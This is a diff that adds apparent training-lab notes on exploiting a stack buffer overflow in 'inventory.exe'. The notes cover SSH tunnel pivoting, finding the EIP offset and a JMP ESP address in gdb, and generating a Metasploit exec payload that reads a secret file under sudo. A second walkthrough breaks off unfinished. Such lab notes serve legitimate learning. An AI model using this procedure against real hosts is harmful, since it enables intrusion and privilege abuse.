@@ -70,8 +70,78 @@ String var1 = length of string local_108
 if not equal to 0
       subtract strings local_208 and local_108
 
+#############################
+  EXPLOITATION DEVELOPMENT
+#############################
+1. ssh student@10.50.39.165 -L 3001:localhost:22 -NT
+2. ssh -p 3001 student@localhost -L 3002:192.168.28.111:2222 -NT
+3. scp -P 3002 comrade@localhost:/.hidden/inventory.exe .
+ON LINOPS
+4. gdb inventory.exe
+5. pdisass main
+      pdisass getTheGoods
+            printf
+            fgets
+6. run till buffer overflow
+7. get the 200 character string
+8. adjust basic script
+9. run <<< $(python inv_buf.py)
+10. take the EIP value of 0x63413563 and input it into wiremask
+      == 76
+11. adjust script again
+12. run <<< $(python inv_buf.py)
+      EIP value should be 'BBBB'
+13. quit
+14a. scp -P 3002 inv_buf.py comrade@localhost:/home/comrade
+ON THE MACHINE BEING EXPLOITED
+14. gdb inventory.exe
+      show env
+      unset env LINES
+      unset env COLOUMNS
+      show env
+15. run a buffer overflow
+16. info proc map
+      0xf7def000   ::   0xfffdd000
+17. find /b 0xf7def000 , 0xfffdd000, 0xff, 0xe4
+    0xf7de3b59
+    0xf7f588ab
+    0xf7f645fb
+    0xf7f6460f
+    0xf7f64aeb
+18. adjust script
+ON LINOPS
+19. msfconsole
+  use payload/linux/x86/exec
+    show options
+  set CMD cat /.secret/.verysecret.pdb
+    show options
+  generate -b "\x00" -f python
+ON MACHINE BEING EXPLOITED
+20. adjust script
+21. sudo ./inventory.exe <<< $(python lin_buf.py)
+      if it errors out re-generate payload
+
+1. ssh student@10.50.39.165 -L 3001:localhost:22 -NT
+2. ssh -p 3001 student@localhost -L 3002:192.168.28.105:2222 -NT
+3. ssh -p 3002 comrade@localhost
+ON LINOPS
+4. scp -P 3002 comrade@localhost:/.hidden/inventory2.exe .
+5. gdb inventory2.exe
+      pdisass main
+            pdisass message
+                  pdisass recv
+6.            
 
 
+
+
+
+
+
+
+
+
+     
 
 
 
